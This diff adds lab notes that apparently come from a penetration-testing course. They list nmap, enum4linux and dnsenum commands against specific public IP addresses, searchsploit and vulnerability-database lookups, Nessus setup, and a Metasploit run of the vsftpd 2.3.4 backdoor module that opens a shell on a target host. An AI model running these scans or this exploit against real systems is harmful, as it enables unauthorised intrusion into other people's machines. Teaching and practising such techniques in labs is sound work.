@@ -1,0 +1,56 @@
+Exp2-Scanning and Enumeration : Scanning and exploiting open ports and services, Scanning for 
+potential exploits in public vulnerability databases.
+-----------------------------------------------------------------------------------
+A.Nmap
+
+>>sudo nmap -sV 52.66.122.218
+>>nmap -sn 52.66.122.218
+>>nmap -sn -iL <file path>
+  nmap -sn -iL /home/kali/Desktop/UserName.txt
+>>nmap -T4 -F 52.66.122.218
+>>sudo nmap -sU -p 1-1024 15.197.255.128
+>>sudo nmap -O 52.66.122.218
+>>nmap -T4 -A -v 52.66.122.218
+>>sudo nmap -sC -sV 52.66.122.218
+----------------------------------------------------------------
+B.enum4linux
+
+>>enum4linux 52.66.122.218
+>>dnsenum 52.66.122.218
+----------------------------------------------------------------
+C. searchsploit
+
+>>searchsploit apache 2.4.29
+---------------------------------------------------------------
+
+Search for Vulnerabilities
+
+>>https://nvd.nist.gov/vuln/search#
+example search for >>CVE-2024-10595, CVE-2024-9680
+>>https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+[Just List down]
+
+--------------------------------------------------------------
+E.Nessus
+https://www.tenable.com/downloads/nessus?loginAttempted=true
+sudo apt install ./Nessus-10.8.3-debian10_amd64.deb
+Check the pdf title <Nessus on KaliLinux.pdf>
+https://127.0.0.1:8834/
+
+>> Create a new scan
+>>Enter Target IP Address
+--------------------------------------------------------------
+Metasploit
+>>sudo msfconsole
+>>msf> search 
+>>msf6 > search vsftpd
+>>msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+>>set RHOSTS 192.168.155.94
+>>Msf6 exploit(exploit/unix/ftp/vsftpd_234_backdoor)>set payload cmd/unix/interact
+>>Msf6 exploit(exploit/unix/ftp/vsftpd_234_backdoor)>exploit
+>>whoami
+
+
+
+
+
